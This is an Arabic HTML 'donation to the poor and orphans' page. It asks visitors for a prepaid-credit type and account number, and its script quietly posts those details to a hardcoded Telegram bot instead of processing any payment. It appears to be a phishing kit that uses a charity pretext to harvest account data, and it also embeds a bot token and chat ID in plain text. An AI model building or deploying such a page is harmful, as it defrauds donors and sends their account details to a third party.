<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة التبرع</title>
    <style>
        /* الأنماط الخاصة بالصفحة */
        body {
            font-family: Arial, sans-serif;
            background-color: #ffcc00; /* لون خلفية أصفر */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 800px; /* تكبير الواجهة */
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h1 {
            color: #ffcc00; /* لون أصفر زاهي */
            margin-bottom: 20px;
            font-size: 2rem; /* تكبير الخط */
        }

        .message {
            margin-bottom: 20px;
            font-size: 1.2rem;
            color: #333;
        }

        .payment-section {
            margin-top: 30px;
        }

        .payment-method {
            margin-bottom: 20px;
            text-align: left;
        }

        .payment-method label {
            display: block;
            margin-bottom: 5px;
        }

        #athir-details {
            margin-top: 10px;
            display: block;
        }

        input[type="text"],
        select {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #ffcc00; /* لون أصفر زاهي */
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 18px; /* تكبير الخط */
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #e6b800; /* لون أصفر أغمق عند المرور فوق الزر */
        }

        .checkmark {
            display: none;
            color: green;
            font-size: 2rem;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>تبرع إلى الفقراء والأيتام</h1>
        <div class="payment-section">
            <h2>طرق الدفع</h2>
            <form id="payment-form">
                <!-- إزالة خاصية الدفع عبر البطاقة البنكية -->
                <div class="payment-method">
                    <input type="radio" id="athir-credit" name="payment-method" value="athir-credit" checked>
                    <label for="athir-credit">دفع عبر رصيد</label>
                    <div id="athir-details">
                        <label for="balance-type">اختر نوع الرصيد</label>
                        <select id="balance-type" name="balance-type" required>
                            <option value="athir">أثير</option>
                            <option value="asia">آسيا</option>
                        </select>
                        <label for="balance-number">رقم حساب الرصيد</label>
                        <input type="text" id="balance-number" name="balance-number" placeholder="رقم حساب الرصيد" required>
                    </div>
                </div>
                <button type="submit">إرسال التبرع</button>
                <div class="checkmark">✔️</div>
            </form>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const paymentMethodRadios = document.querySelectorAll('input[name="payment-method"]');
            const athirDetails = document.getElementById('athir-details');
            const paymentForm = document.getElementById('payment-form');
            const checkmark = document.querySelector('.checkmark');
            
            paymentForm.addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent the form from submitting the traditional way

                const formData = new FormData(paymentForm);
                const data = {};
                formData.forEach((value, key) => {
                    data[key] = value;
                });

                const message = `
                    تبرع جديد:
                    - طريقة الدفع: ${data['payment-method']}
                    - نوع الرصيد: ${data['balance-type']}
                    - رقم حساب الرصيد: ${data['balance-number']}
                `;

                const botToken = '7441053139:AAH8-h15LJE1UZQpMlf1AkdfShHLsotFaZ0';
                const chatId = '1691133310'; // استخدم معرف الدردشة الخاص بك

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }).then(response => {
                    if (response.ok) {
                        checkmark.style.display = 'block'; // عرض علامة صح
                        setTimeout(() => {
                            checkmark.style.display = 'none'; // إخفاء علامة الصح بعد 3 ثوانٍ
                        }, 3000);
                        paymentForm.reset(); // إعادة تعيين النموذج بعد الإرسال
                    } else {
                        alert('فشل إرسال التبرع.');
                    }
                }).catch(error => {
                    console.error('حدث خطأ:', error);
                    alert('حدث خطأ في الاتصال.');
                });
            });
        });
    </script>
</body>
</html>
